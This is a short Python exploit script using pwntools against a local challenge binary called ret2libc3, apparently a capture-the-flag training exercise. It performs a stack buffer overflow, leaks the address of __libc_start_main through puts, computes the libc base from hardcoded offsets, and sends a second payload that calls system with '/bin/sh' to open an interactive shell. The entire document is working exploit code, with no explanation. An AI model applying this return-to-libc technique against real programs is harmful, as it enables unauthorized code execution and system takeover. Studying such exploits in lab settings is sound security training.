from pwn import *


sh = process("./ret2libc3")

elf = ELF("./ret2libc3")

#print(hex(elf.got["__libc_start_main"]))

main = elf.symbols['main']

payload = b"A" * 112 + p32(elf.plt["puts"]) + p32(main) + p32(elf.got["__libc_start_main"])

sh.recvuntil(b"!?")

#gdb.attach(sh)

sh.sendline(payload)

__libc_start_main_addr = u32(sh.recvuntil(b'!?')[0 : 4])

log.success("the address of startmain is:" + hex(__libc_start_main_addr))

base_addr =  __libc_start_main_addr - 0x21560

system_addr = base_addr + 0x48170

binsh_addr = base_addr + 0x1bd0d5

payload = b'A' * 104 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)

sh.sendline(payload)

sh.interactive()
